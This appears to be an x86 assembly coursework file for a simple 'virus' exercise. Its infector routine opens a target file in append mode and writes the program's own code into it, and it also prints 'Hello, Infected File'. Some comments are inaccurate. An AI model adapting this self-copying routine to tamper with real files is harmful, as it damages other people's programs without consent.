section .data
    virus: dd "Hello, Infected File", 10, 0
    DummyStr_Str1:
STDOUT EQU 1
WRITE EQU 4
OPEN EQU 5
CLOSE EQU 6
FILE_PER EQU 0777
EDIT EQU 1024
global infection
global code_end
global infector
global _start
global code_start
global system_call

extern main

section .text
code_start:


infection:
    push    ebp
    mov     ebp, esp
    sub     esp, 4
    mov     edx, DummyStr_Str1 - virus -1 ;trick from class
    push    virus
    push    STDOUT
    push    WRITE
    call    system_call   ; use the system call as directed in the assigment
    add     esp, 4 ;remove write
    add     esp, 4 ;remove stdout
    add     esp, 4 ;remove virus
    mov     esp, ebp
    pop     ebp
    ret

open_file:
	push FILE_PER           ;Permission
	push EDIT | 1           ; Edit
	mov eax, [ebp + 8]
	push eax                ;file path
	push OPEN
	call system_call
	add esp, 4              ;remove open
	add esp, 4              ;remove filepath
	add esp, 4              ;remove edit
	add esp, 4              ;remove permission
	push eax                ; push file path
	jmp write_file


infector:
    push    ebp
    mov     ebp, esp
	pushad
	jmp open_file

close_file:
	push CLOSE
	call system_call
	add esp, 8
	popad
	mov esp, ebp
	pop ebp
	ret

write_file:
	push code_end - code_start      ; num of bytes to write
	push code_start                 ; where to start reading
	push eax                        ; push file path
	push WRITE                       ; system call write
	call system_call
	add esp, 4                       ; remove system call
	add esp, 4                       ;remove write
	add esp, 4                         ;remove path
	add esp, 4                         ;remove num of bytes
	jmp close_file

code_end:

_start:
    pop dword ecx      ; ecx = argc
    mov esi, esp        ; esi = argv
    mov eax, ecx        ; Put the number of arguments into eax
    shl eax, 2      ; Compute the size of argv in bytes
    add eax, esi        ; Add the size to the address of argv
    add eax, 4      ; Skip NULL at the end of argv
    push dword eax      ; char *envp[]
    push dword esi      ; char *argv[]
    push dword ecx      ; int argc
    call main       ; int main( int argc, char *argv[], char *envp[] )
    mov ebx, eax
    mov eax, 1
    int 0x80
    nop

system_call:
    push ebp            ; Save caller state
    mov ebp, esp
    sub esp, 4          ; Leave space for local var on stack
    pushad          ; Save some more caller state
    mov eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov ebx, [ebp+12]   ; Next argument...
    mov ecx, [ebp+16]   ; Next argument...
    mov edx, [ebp+20]   ; Next argument...
    int 0x80        ; Transfer control to operating system
    mov [ebp-4], eax    ; Save returned value...
    popad           ; Restore caller state (registers)
    mov eax, [ebp-4]    ; Place returned value where caller can see it
    add esp, 4          ; Restore caller state
    pop ebp         ; Restore caller state
    ret             ; Back to caller
